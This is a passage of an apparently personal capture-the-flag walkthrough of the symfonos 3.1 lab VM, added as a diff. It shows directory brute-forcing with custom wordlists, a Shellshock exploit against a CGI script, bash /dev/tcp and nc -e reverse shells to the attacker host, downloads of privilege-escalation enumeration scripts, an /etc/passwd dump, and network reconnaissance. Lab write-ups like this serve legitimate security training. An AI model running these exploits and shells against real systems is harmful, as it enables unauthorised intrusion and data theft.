@@ -500,5 +500,1147 @@ Scanning: http://192.168.56.92/gate/
 </code></pre>
 <p>Feroxbuster found /cgi-bin/underworld.</p>
 <p>But I cannot find anything after that.</p>
+<h2 id="section">2022.01.08</h2>
+<pre class="shell"><code>curl -s https://en.wikipedia.org/wiki/Cerberus | html2text | tr &quot; &quot; &quot;\n&quot; | egrep -v &quot;[ -~]&quot; | sort | uniq | sort &gt; cerberus.txt
+</code></pre>
+<pre class="shell"><code>wc cerberus.txt
+ 1967  1972 15765 cerberus.txt
+</code></pre>
+<pre class="shell"><code>cat cerberus.txt | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39; &gt; cerberus.lower.txt
+</code></pre>
+<pre class="shell"><code>wc cerberus.lower.txt
+ 1967  1972 15765 cerberus.lower.txt
+</code></pre>
+<pre class="shell"><code>cat cerberus.txt cerberus.lower.txt &gt; cerberus.words.txt
+</code></pre>
+<pre class="shell"><code>wc cerberus.words.txt
+ 3934  3944 31530 cerberus.words.txt
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/ --wordlist=./cerberus.words.txt -q -f --wildcard -x php,cgi,bak,txt
+/tartarus/            (Status: 200) [Size: 273]
+</code></pre>
+<pre class="shell"><code>curl -s https://en.wikipedia.org/wiki/Tartarus | html2text | tr &quot; &quot; &quot;\n&quot; | egrep -v &quot;[ -~]&quot; | sort | uniq | sort &gt; tartarus.txt
+</code></pre>
+<pre class="shell"><code>wc tartarus.txt
+ 2015  2021 16188 tartarus.txt
+</code></pre>
+<pre class="shell"><code>cat tartarus.txt | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39; &gt; tartarus.lower.txt
+</code></pre>
+<pre class="shell"><code>cat tartarus.txt tartarus.lower.txt &gt; tartarus.words.txt
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/tartarus/ --wordlist=./tartarus.words.txt -q -f --wildcard -x php,cgi,bak,txt
+/acheron/             (Status: 403) [Size: 278]
+/charon/              (Status: 403) [Size: 278]
+/cocytus/             (Status: 403) [Size: 278]
+/hermes/              (Status: 403) [Size: 278]
+/phlegethon/          (Status: 403) [Size: 278]
+/titanomachy/         (Status: 403) [Size: 278]
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/tartarus/ --wordlist=./cerberus.words.txt -q -f --wildcard -x php,cgi,bak,txt
+/acheron/             (Status: 403) [Size: 278]
+/charon/              (Status: 403) [Size: 278]
+/cocytus/             (Status: 403) [Size: 278]
+/hermes/              (Status: 403) [Size: 278]
+/phlegethon/          (Status: 403) [Size: 278]
+/titanomachy/         (Status: 403) [Size: 278]
+</code></pre>
+<p>The journey in web so far, in pictures…</p>
+<figure>
+<img src="3.homepage.png" alt="" /><figcaption>3.homepage</figcaption>
+</figure>
+<figure>
+<img src="4.gate.png" alt="" /><figcaption>4.gate</figcaption>
+</figure>
+<figure>
+<img src="5.cerberus.png" alt="" /><figcaption>5.cerberus</figcaption>
+</figure>
+<figure>
+<img src="6.tartarus.png" alt="" /><figcaption>6.tartarus</figcaption>
+</figure>
+<figure>
+<img src="7.forbidden-hermes.png" alt="" /><figcaption>7.forbidden-hermes</figcaption>
+</figure>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/tartarus/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -f --wildcard -x php,cgi,bak,txt
+/hermes/              (Status: 403) [Size: 278]
+/charon/              (Status: 403) [Size: 278]
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/tartarus/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q  -x php,cgi,bak,txt
+/research             (Status: 200) [Size: 6825]
+/hermes               (Status: 301) [Size: 338] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/hermes/]
+/charon               (Status: 301) [Size: 338] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/charon/]
+</code></pre>
+<p>This is without <code>-f</code>. I had to do it with every scan.</p>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/ --wordlist=./cerberus.words.txt -q -x php,cgi,bak,txt
+/tartarus             (Status: 301) [Size: 331] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/]
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus/tartarus --wordlist=./cerberus.words.txt -q -x php,cgi,bak,txt
+/acheron              (Status: 301) [Size: 339] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/acheron/]
+/charon               (Status: 301) [Size: 338] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/charon/]
+/cocytus              (Status: 301) [Size: 339] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/cocytus/]
+/hermes               (Status: 301) [Size: 338] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/hermes/]
+/phlegethon           (Status: 301) [Size: 342] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/phlegethon/]
+/titanomachy          (Status: 301) [Size: 343] [--&gt; http://192.168.56.92/gate/cerberus/tartarus/titanomachy/]
+</code></pre>
+<p>I guess I need to find a way, where same word is used with and without trailing slash.</p>
+<h3 id="gatecerberustartarusresearch">/gate/cerberus/tartarus/research</h3>
+<pre class="shell"><code>curl -s http://$RHOST/gate/cerberus/tartarus/research
+Hidden deep within the bowels of the earth and ruled by the god Hades and his wife Persephone, the Underworld was the kingdom of the dead in Greek mythology, the sunless place where the souls of those who died went after death. Watered by the streams of five rivers (Styx, Acheron, Cocytus, Phlegethon, and Lethe), the Underworld was divided into at least four regions: Tartarus (reserved for the worst transgressors), the Elysian Fields (where only the most excellent of men dwelled), the Fields of Mourning (for those who were hurt by love), and the Asphodel Meadows (for the souls of the majority of ordinary people).
+
+The Geography of the Underworld
+Much of what we know about how the Ancient Greeks and Romans imagined the Underworld we know from Homers Odyssey and Virgils Aeneid. However, even these two visions are somewhat conflicting, so, sometimes, we have to resort to assumptions to reconstruct the Greek Underworld in its entirety.
+
+Entrances
+According to Homer, the Underworld was located beyond the earth-encircling river of Ocean, at the far western end of the world. However, some other authors inform us that there were quite a few places within the known world one could use as portals to enter the kingdom of the dead:
+
+  A cavern near the ancient town of Tenarus. Situated at the tip of the middle promontory of Peloponnese (known back then as Cape Tanaerum, and called Cape Matapan today), the cave exists to this very day; it was through this cave that Heracles dragged Cerberus out of Hades and Orpheus tried to bring Eurydice back to the world of the living.
+
+  The bottomless Alcyonian Lake at Lerna. Guarded by the fearsome Hydra, the Alcyonian Lake was supposedly used by Dionysus to enter the Underworld and search for his mother Semele; some even say that Hades abducted Persephone in its very vicinity.
+
+  The volcanic Lake Avernus. Located in southern Italy near the city of Naples, Avernus was sometimes used as a synonym for the Underworld in Roman times; it is through a cave found near this lake that Aeneas descends to the Underworld in Virgils Aeneid.
+
+Rivers
+By all accounts, the Underworld was a chill and shadowy place, watered by the streams of five infernal rivers:
+
+  The Styx. Circling the Underworld seven times, Styx was the river of hatred and unbreakable oaths; the gods are often depicted as taking vows by its waters.
+
+  The Acheron. The river of sorrow and pain, black and deep.
+
+  The Cocytus. The river of lamentation and wailing.
+
+  The Phlegethon. The river of fire, possibly leading to the depths of Tartarus.
+
+  The Lethe. The river of oblivion and forgetfulness, out of which the dead souls are obliged to drink so that they can forget their earthly lives in preparation for a possible reincarnation.
+
+Structure
+Initially, it seems that the Ancient Greeks believed that all souls, regardless of how exemplary or dishonorable their earthly lives might have been, ended up in the same place after death. And for most of them, the Underworld couldnt have been a particularly pleasant place: it was rather like living through the same dismal nightmare over and over again, battling for breath in a world inhabited by shadows, barren of hope, ill-lit and desolate. And this is how sometimes the Underworld is described by ancient authors: nothing more than a joyless realm where the dead were supposed to slowly fade into nothingness or, as we learn from Platos Myth of Er, prepare themselves for a reincarnation back to earth.
+
+However, this all changed at some stage, and according to later writers, the Underworld was divided into at least four different regions:
+
+  Tartarus. In The Iliad Zeus claims that Tartarus is â€œas far beneath Hades as heaven is above earth and that it aoeis the deepest gulf beneath the earth, the gates whereof are of iron and the threshold of bronze. Originally the dungeon of the rebels against the divine order (the Cyclopes and the Hecatoncheires during the reign of Cronus, and the Titans once Zeus came to power), Tartarus eventually ended up housing the worst of perpetrators, destined here to eternally endure punishments fitting their earthly crimes. Some of Tartarus most famous inhabitants were Sisyphus, Tantalus, Ixion, and Tityos.
+
+  The Fields of Mourning. As we read in the Aeneid, the Fields of Mourning are reserved for the souls of those whom ruthless love did waste away; here, they wander in paths unseen, or in the gloom of dark myrtle grove: not even in death have they forgot their griefs of long ago. Curiously enough, almost all of the fields inhabitants mentioned by Virgil are women: Phaedra, Procris, Pasiphae, Evadne, Laodamia, and, of course, Dido.
+
+  The Asphodel Meadows. We dont know that much about the Asphodel Meadows it could have been a realm of utter neutrality but we do know that it is there that Odysseus meets the shade of Achilles in Homers Odyssey. Grieve not at all that thou art dead, Achilles, says Odysseus unto him, pointing out to the great hero that he is blessed to rule mightily among the dead of this region. If I could choose, replies Achilles memorably, I would rather be a paid servant in a poor man&#39;s house and be above ground than king of kings among the dead.
+
+  The Elysian Fields. Strangely enough, other authors place Achilles in a wholly different realm of the Underworld called Elysium (or the Isles of the Blessed if the two are one and the same), where only the most exceptional mortals were privileged with a life free of toils and pains. Ruled by either Rhadamanthus or Cronus (or both), Elysium was a land of eternal sunlight and rosy meadows, inhabited by the likes of Cadmus, Peleus, and Menelaus.
+
+The Journey of a Soul After Death
+I Hermes
+Upon death, a soul was led by Hermes near the entrance of the Underworld, where a ferry awaited to carry it across either the Acheron or the Styx.
+
+II Charon
+This ferry was rowed by Charon, the infernal boatman tasked with taking the souls of the dead to the Underworld proper. Only those who could pay the fare with coins (obols) placed on their eyes or under their tongue when buried, were granted passage; the rest remained trapped between two worlds. (Aeneas was only able to enter the Underworld once his guide, the Cumaean Sybil showed Charon a golden bough, Aeneas gift for Persephone.)
+
+III Cerberus
+After the boat ride, the souls entered through the gates of the Underworld; the gates were guarded by the multiheaded dog Cerberus, who allowed everyone to enter, but none to leave.
+
+IV The Judges
+
+The souls then appeared before a panel of three judges, Rhadamanthus, Minos, and Aeacus, who passed sentence based on the mortals deeds during their previous life. Most souls seem to have ended up in the neutral zone, the Asphodel Meadows; for better or for worse, others were singled out for special treatment.
+</code></pre>
+<pre class="shell"><code>curl -s http://$RHOST/gate/cerberus/tartarus/research | html2text | tr &quot; &quot; &quot;\n&quot; | egrep -v &quot;[ -~]&quot; | sort | uniq | sort &gt; research.words.txt
+
+wc research.words.txt
+ 435  435 2930 research.words.txt
+
+mv research.words.txt research.txt
+
+cat research.txt | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39; &gt; research.lower.txt
+
+cat research.txt research.lower.txt &gt; research.words.txt
+
+gobuster dir --url http://$RHOST/gate/cerberus/tartarus --wordlist=./cerberus.words.txt -q -x php,cgi,bak,txt
+
+ffuf -u http://$RHOST/cgi-bin/FUZZ -w ./research.words.txt -fc 403,404,401,400 -s
+underworld
+
+</code></pre>
+<h2 id="cgi-binunderworld">/cgi-bin/underworld</h2>
+<figure>
+<img src="8.underworld-cgi.png" alt="" /><figcaption>8.underworld-cgi</figcaption>
+</figure>
+<p>Theory: cgi + apache = shellshock.</p>
+<pre class="shell"><code>searchsploit shellshock | grep .py
+Apache mod_cgi - &#39;Shellshock&#39; Remote Command Injection                                      | linux/remote/34900.py
+Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)                           | hardware/remote/39568.py
+dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)                     | linux/remote/36933.py
+Postfix SMTP 4.2.x &lt; 4.2.48 - &#39;Shellshock&#39; Remote Command Injection                         | linux/remote/34896.py
+RedStar 3.0 Server - &#39;Shellshock&#39; &#39;BEAM&#39; / &#39;RSSMON&#39; Command Injection                       | linux/local/40938.py
+TrendMicro InterScan Web Security Virtual Appliance - &#39;Shellshock&#39; Remote Command Injection | hardware/remote/40619.py
+</code></pre>
+<pre class="shell"><code>searchsploit -m linux/remote/34900.py
+  Exploit: Apache mod_cgi - &#39;Shellshock&#39; Remote Command Injection
+      URL: https://www.exploit-db.com/exploits/34900
+     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/f0c1s/vuln-hubs/symfonos/3.1/wiki/34900.py</code></pre>
+<p>Add “/cgi-bin/underworld” to the list of cgis to test.</p>
+<pre class="shell"><code>python2 34900.py payload=reverse rhost=192.168.56.92 lport=2345 lhost=192.168.56.70
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-bin/underworld
+[!] Successfully exploited
+[!] Incoming connection from 192.168.56.92
+192.168.56.92&gt; id
+uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
+
+192.168.56.92&gt; whoami
+cerberus
+
+192.168.56.92&gt; date
+Sat Jan  8 05:14:17 CST 2022
+
+192.168.56.92&gt; pwd
+/usr/lib/cgi-bin
+
+192.168.56.92&gt; ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Jul 20  2019 .
+drwxr-xr-x 52 root root 4096 Apr  6  2020 ..
+-rwxr-xr-x  1 root root   63 Jul 20  2019 underworld
+
+192.168.56.92&gt; cat underworld
+#!/bin/bash
+
+echo &quot;Content-type: text/html&quot;;
+echo &quot;&quot;
+
+uptime
+
+
+
+192.168.56.92&gt;
+192.168.56.92&gt;</code></pre>
+<h2 id="reverse-shell">Reverse shell</h2>
+<pre class="shell"><code>192.168.56.92&gt;
+192.168.56.92&gt; bash -i &gt;&amp; /dev/tcp/192.168.56.92/443 0&gt;&amp;1
+/bin/bash: connect: Connection refused
+
+192.168.56.92&gt; bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x38.0x5c/443 0&gt;&amp;1
+/bin/bash: line 8: /dev/tcp/192.168.56.92/443: Connection refused
+
+192.168.56.92&gt; bash -i &gt;&amp; /dev/tcp/0xc0a8385c/443 0&gt;&amp;1
+/bin/bash: connect: Connection refused
+/bin/bash: line 9: /dev/tcp/0xc0.0xa8.0x38.0x5c/443: Connection refused
+
+192.168.56.92&gt; which nc
+/bin/bash: connect: Connection refused
+/bin/bash: line 10: /dev/tcp/0xc0a8385c/443: Connection refused
+
+192.168.56.92&gt;
+/bin/nc
+
+192.168.56.92&gt; nc -nvC 192.168.56.70 443 -e /bin/bash
+(UNKNOWN) [192.168.56.70] 443 (https) open
+192.168.56.92&gt;</code></pre>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.92 48290
+whoami
+cerberus
+id
+uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
+which python
+/usr/bin/python
+python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+cerberus@symfonos3:/usr/lib/cgi-bin$</code></pre>
+<h3 id="home">/home</h3>
+<pre class="shell"><code>cerberus@symfonos3:/usr/lib$ cd /home
+cd /home
+cerberus@symfonos3:/home$ ls -lAhR
+ls -lAhR
+.:
+total 8.0K
+drwxr-xr-x 2 cerberus cerberus 4.0K Jul 20  2019 cerberus
+drwxr-xr-x 3 hades    hades    4.0K Apr  6  2020 hades
+
+./cerberus:
+total 12K
+lrwxrwxrwx 1 root     root        9 Jul 20  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 cerberus cerberus  220 Jul 20  2019 .bash_logout
+-rw-r--r-- 1 cerberus cerberus 3.5K Jul 20  2019 .bashrc
+-rw-r--r-- 1 cerberus cerberus  675 Jul 20  2019 .profile
+
+./hades:
+total 20K
+lrwxrwxrwx 1 root  root     9 Jul 20  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 hades hades  220 Jul 19  2019 .bash_logout
+-rw-r--r-- 1 hades hades 3.5K Jul 19  2019 .bashrc
+drwxr-xr-x 2 hades hades 4.0K Jul 20  2019 .nano
+-rw-r--r-- 1 hades hades  675 Jul 19  2019 .profile
+-rw-r--r-- 1 hades hades  165 Apr  6  2020 .wget-hsts
+
+./hades/.nano:
+total 0
+</code></pre>
+<h3 id="etcpasswd">/etc/passwd</h3>
+<pre class="shell"><code>cerberus@symfonos3:/home$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+Debian-exim:x:105:109::/var/spool/exim4:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+hades:x:1000:1000:,,,:/home/hades:/bin/bash
+cerberus:x:1001:1001:,,,:/home/cerberus:/bin/bash
+proftpd:x:108:65534::/run/proftpd:/bin/false
+ftp:x:109:65534::/srv/ftp:/bin/false</code></pre>
+<h3 id="no-space-left-on-the-device">no space left on the device</h3>
+<pre class="shell"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.56.92 - - [08/Jan/2022 11:21:03] &quot;GET /lse.sh HTTP/1.1&quot; 200 -
+192.168.56.92 - - [08/Jan/2022 11:21:03] &quot;GET /LinEnum.sh HTTP/1.1&quot; 200 -
+192.168.56.92 - - [08/Jan/2022 11:21:03] &quot;GET /linpeas.sh HTTP/1.1&quot; 200 -
+----------------------------------------
+Exception occurred during processing of request from (&#39;192.168.56.92&#39;, 47516)
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3.9/socketserver.py&quot;, line 683, in process_request_thread
+    self.finish_request(request, client_address)
+  File &quot;/usr/lib/python3.9/socketserver.py&quot;, line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File &quot;/usr/lib/python3.9/http/server.py&quot;, line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File &quot;/usr/lib/python3.9/socketserver.py&quot;, line 747, in __init__
+    self.handle()
+  File &quot;/usr/lib/python3.9/http/server.py&quot;, line 427, in handle
+    self.handle_one_request()
+  File &quot;/usr/lib/python3.9/http/server.py&quot;, line 415, in handle_one_request
+    method()
+  File &quot;/usr/lib/python3.9/http/server.py&quot;, line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File &quot;/usr/lib/python3.9/http/server.py&quot;, line 860, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File &quot;/usr/lib/python3.9/shutil.py&quot;, line 208, in copyfileobj
+    fdst_write(buf)
+  File &quot;/usr/lib/python3.9/socketserver.py&quot;, line 826, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+192.168.56.92 - - [08/Jan/2022 11:22:40] &quot;GET /lse.sh HTTP/1.1&quot; 200 -
+^C
+Keyboard interrupt received, exiting.</code></pre>
+<pre class="shell"><code>cerberus@symfonos3:/home$ cd /tmp
+cd /tmp
+cerberus@symfonos3:/tmp$ wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
+wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
+cerberus@symfonos3:/tmp$ ls -la
+ls -la
+total 8
+drwxrwxrwt  2 root     root     4096 Jan  8 05:21 .
+drwxr-xr-x 22 root     root     4096 Jul 19  2019 ..
+-rw-r--r--  1 cerberus cerberus    0 Jan  8 05:21 LinEnum.sh
+-rw-r--r--  1 cerberus cerberus    0 Jan  8 05:21 linpeas.sh
+-rw-r--r--  1 cerberus cerberus    0 Jan  8 05:21 lse.sh
+cerberus@symfonos3:/tmp$ chmod +x *.sh
+chmod +x *.sh
+cerberus@symfonos3:/tmp$ ls -la
+ls -la
+total 8
+drwxrwxrwt  2 root     root     4096 Jan  8 05:21 .
+drwxr-xr-x 22 root     root     4096 Jul 19  2019 ..
+-rwxr-xr-x  1 cerberus cerberus    0 Jan  8 05:21 LinEnum.sh
+-rwxr-xr-x  1 cerberus cerberus    0 Jan  8 05:21 linpeas.sh
+-rwxr-xr-x  1 cerberus cerberus    0 Jan  8 05:21 lse.sh
+cerberus@symfonos3:/tmp$ ./lse.sh
+./lse.sh
+cerberus@symfonos3:/tmp$ export TERM=&quot;xterm-256colo&quot;
+export TERM=&quot;xterm-256colo&quot;
+cerberus@symfonos3:/tmp$ export TERM=&quot;xterm-256color&quot;
+export TERM=&quot;xterm-256color&quot;
+cerberus@symfonos3:/tmp$ ./lse.sh
+./lse.sh
+cerberus@symfonos3:/tmp$ chmod +x lse.sh
+chmod +x lse.sh
+cerberus@symfonos3:/tmp$ ./lse.sh
+./lse.sh
+cerberus@symfonos3:/tmp$
+
+cerberus@symfonos3:/tmp$ wget -v  192.168.56.70/lse.sh
+wget -v  192.168.56.70/lse.sh
+--2022-01-08 05:22:38--  http://192.168.56.70/lse.sh
+Connecting to 192.168.56.70:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 43570 (43K) [text/x-sh]
+Saving to: &#39;lse.sh.1&#39;
+
+lse.sh.1              0%[                    ]       0  --.-KB/s    in 0s
+
+
+Cannot write to &#39;lse.sh.1&#39; (No space left on device).
+cerberus@symfonos3:/tmp$ ls -la
+ls -la
+total 8
+drwxrwxrwt  2 root     root     4096 Jan  8 05:22 .
+drwxr-xr-x 22 root     root     4096 Jul 19  2019 ..
+-rwxr-xr-x  1 cerberus cerberus    0 Jan  8 05:21 LinEnum.sh
+-rwxr-xr-x  1 cerberus cerberus    0 Jan  8 05:21 linpeas.sh
+-rwxr-xr-x  1 cerberus cerberus    0 Jan  8 05:21 lse.sh
+-rw-r--r--  1 cerberus cerberus    0 Jan  8 05:22 lse.sh.1
+cerberus@symfonos3:/tmp$</code></pre>
+<figure>
+<img src="9.trying-to-enumerate.png" alt="" /><figcaption>9.trying-to-enumerate</figcaption>
+</figure>
+<h3 id="pcap-group">pcap group???</h3>
+<pre class="shell"><code>cerberus@symfonos3:/tmp$ cat /etc/shadow
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+cerberus@symfonos3:/tmp$ groups
+groups
+cerberus www-data pcap
+</code></pre>
+<h3 id="tcpdump">tcpdump</h3>
+<pre class="shell"><code>cerberus@symfonos3:/tmp$ which tcpdump
+which tcpdump
+/usr/local/bin/tcpdump
+cerberus@symfonos3:/tmp$ ip a s
+ip a s
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: enp0s17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:d0:e8:29 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.92/24 brd 192.168.56.255 scope global enp0s17
+       valid_lft forever preferred_lft forever
+    inet6 fe80::a00:27ff:fed0:e829/64 scope link
+       valid_lft forever preferred_lft forever
+cerberus@symfonos3:/tmp$ netstat -antuple
+netstat -antuple
+bash: netstat: command not found
+cerberus@symfonos3:/tmp$ ss
+ss
+Netid  State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port
+u_str  ESTAB      0      0       * 10803                 * 10804
+u_str  ESTAB      0      0       * 10990                 * 10989
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10854                 * 10853
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 11688                 * 11687
+u_str  ESTAB      0      0       * 10853                 * 10854
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10804                 * 10803
+u_str  ESTAB      0      0       * 10516                 * 10517
+u_str  ESTAB      0      0       * 10989                 * 10990
+u_str  ESTAB      0      0       * 10708                 * 10709
+u_str  ESTAB      0      0       * 10659                 * 10991
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10517                 * 10516
+u_str  ESTAB      0      0      /var/run/dbus/system_bus_socket 10991                 * 10659
+u_str  ESTAB      0      0       * 11687                 * 11688
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 9716                  * 9706
+u_str  ESTAB      0      0       * 9706                  * 9716
+u_str  ESTAB      0      0       * 10943                 * 10992
+u_str  ESTAB      0      0      /var/run/dbus/system_bus_socket 10992                 * 10943
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10709                 * 10708
+tcp    ESTAB      0      0      192.168.56.92:48290                192.168.56.70:https
+cerberus@symfonos3:/tmp$ ss -ant
+ss -ant
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+LISTEN     0      128          *:22                       *:*
+TIME-WAIT  0      0      127.0.0.1:52420              127.0.0.1:80
+ESTAB      0      91     192.168.56.92:48290              192.168.56.70:443
+LISTEN     0      128         :::80                      :::*
+LISTEN     0      32          :::21                      :::*
+LISTEN     0      128         :::22                      :::*
+cerberus@symfonos3:/tmp$</code></pre>
+<pre class="shell"><code>cerberus@symfonos3:/tmp$ ss -a
+ss -a
+Netid  State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port
+nl     UNCONN     0      0      rtnl:agetty/392             *
+nl     UNCONN     0      0      rtnl:kernel                 *
+nl     UNCONN     0      0      rtnl:agetty/392             *
+nl     UNCONN     768    0      tcpdiag:kernel                 *
+nl     UNCONN     4352   0      tcpdiag:ss/9970                *
+nl     UNCONN     0      0      selinux:kernel                 *
+nl     UNCONN     0      0      audit:kernel                 *
+nl     UNCONN     0      0      audit:systemd/1              *
+nl     UNCONN     0      0      audit:-1392454343            *
+nl     UNCONN     0      0      audit:systemd/1              *
+nl     UNCONN     0      0      fiblookup:kernel                 *
+nl     UNCONN     0      0      connector:kernel                 *
+nl     UNCONN     0      0      uevent:-1479027747            *
+nl     UNCONN     0      0      uevent:systemd-logind/328     *
+nl     UNCONN     0      0      uevent:-62018790              *
+nl     UNCONN     0      0      uevent:-1633744527            *
+nl     UNCONN     0      0      uevent:-433720934             *
+nl     UNCONN     0      0      uevent:kernel                 *
+nl     UNCONN     0      0      uevent:systemd/1              *
+nl     UNCONN     0      0      uevent:-433720934             *
+nl     UNCONN     0      0      uevent:-1633744527            *
+nl     UNCONN     0      0      uevent:-1479027747            *
+nl     UNCONN     0      0      uevent:systemd-logind/328     *
+nl     UNCONN     0      0      uevent:-62018790              *
+nl     UNCONN     0      0      uevent:systemd/1              *
+nl     UNCONN     0      0      genl:kernel                 *
+nl     UNCONN     0      0      scsi-trans:kernel                 *
+p_raw  UNCONN     0      0       *:enp0s17                *
+u_dgr  UNCONN     0      0      /run/systemd/journal/dev-log 8978                  * 0
+u_seq  LISTEN     0      128    /run/udev/control 8985                  * 0
+u_str  LISTEN     0      128    /var/run/dbus/system_bus_socket 10647                 * 0
+u_dgr  UNCONN     0      0      /run/systemd/notify 8910                  * 0
+u_str  LISTEN     0      1      /var/run/fail2ban/fail2ban.sock 11984                 * 0
+u_dgr  UNCONN     0      0      /run/systemd/cgroups-agent 8912                  * 0
+u_str  LISTEN     0      128    /run/systemd/private 8916                  * 0
+u_str  LISTEN     0      128    /run/systemd/fsck.progress 8921                  * 0
+u_dgr  UNCONN     0      0      /run/systemd/journal/syslog 8929                  * 0
+u_str  LISTEN     0      128    /run/systemd/journal/stdout 8936                  * 0
+u_dgr  UNCONN     0      0      /run/systemd/journal/socket 8938                  * 0
+u_str  ESTAB      0      0       * 10803                 * 10804
+u_str  ESTAB      0      0       * 10990                 * 10989
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10854                 * 10853
+u_dgr  UNCONN     0      0       * 10934                 * 8938
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 11688                 * 11687
+u_str  ESTAB      0      0       * 10853                 * 10854
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10804                 * 10803
+u_str  ESTAB      0      0       * 10516                 * 10517
+u_dgr  UNCONN     0      0       * 10967                 * 0
+u_str  ESTAB      0      0       * 10989                 * 10990
+u_dgr  UNCONN     0      0       * 9743                  * 9744
+u_dgr  UNCONN     0      0       * 11245                 * 8978
+u_dgr  UNCONN     0      0       * 10642                 * 10641
+u_dgr  UNCONN     0      0       * 8915                  * 8914
+u_str  ESTAB      0      0       * 10708                 * 10709
+u_dgr  UNCONN     0      0       * 10641                 * 10642
+u_str  ESTAB      0      0       * 10659                 * 10991
+u_str  ESTAB      0      0      /run/systemd/journal/stdout 10517                 * 10516
